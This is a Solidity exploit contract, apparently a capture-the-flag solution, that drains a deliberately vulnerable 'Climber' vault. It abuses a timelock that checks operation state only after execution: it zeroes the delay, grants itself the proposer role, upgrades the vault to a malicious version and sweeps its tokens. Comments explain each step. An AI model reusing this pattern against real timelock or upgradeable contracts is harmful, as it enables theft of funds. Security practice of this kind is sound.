// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "./ClimberVaultV2.sol";

contract ClimberAttacker {
  using Address for address;

  ClimberTimelock immutable timelock;
  ClimberVault immutable vault;
  address immutable attacker;
  address immutable token;
  
  address[] targets = new address[](4);
  uint256[] values = new uint256[](4);
  bytes[] dataElements = new bytes[](4);
  bytes32 salt = bytes32(0);
  
  ClimberVaultV2 vaultV2 = new ClimberVaultV2();
  
  bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

  constructor (address payable timelockAddr, address vaultAddr, address tokenAddr) {
    timelock = ClimberTimelock(timelockAddr);
    vault = ClimberVault(vaultAddr);
    token = tokenAddr;
    attacker = msg.sender;
  }
  
  function schedule() public {
    timelock.schedule(targets, values, dataElements, salt);
  }

  function exploit() external {
    // the main issue in the timelock is that, on execute(), the operation state is checked after
    // the execution. this being the case, it's possible to execute any number of arbitrary functions as the
    // timelock (that's also the vault's owner) until that state is checked.
    // as we can change the delay to 0 and our role to proposer, we can schedule the operation before
    // that check to block.timestamp and make it seem it was placed before, this way the transaction won't
    // revert. considering that the timelock is the vault's owner, we can then upgrade the vault's contract
    // to add a function to sweep the funds without the need to be a sweeper.
    
    targets[0] = address(timelock);
    values[0] = 0;
    dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
    
    targets[1] = address(timelock);
    values[1] = 0;
    dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));
    
    targets[2] = address(this);
    values[2] = 0;
    // here we use a little bit of a trick - since dataElements at this point is different than
    // dataElements on execute, the generated IDs would also be different.
    // that's why we can't change the timeclock to proposer and run schedule directly in those function calls.
    // we can bypass this by keeping the values at the contract storage and calling schedule from this contract,
    // this way the generated IDs will be the same.
    dataElements[2] = abi.encodeWithSignature("schedule()");
    
    targets[3] = address(vault);
    values[3] = 0;
    dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(vaultV2));
    
    timelock.execute(targets, values, dataElements, salt);
    
    address(vault).functionCall(
      abi.encodeWithSignature("sweepFundsBypass(address,address)", token, attacker)
    );
  }
}
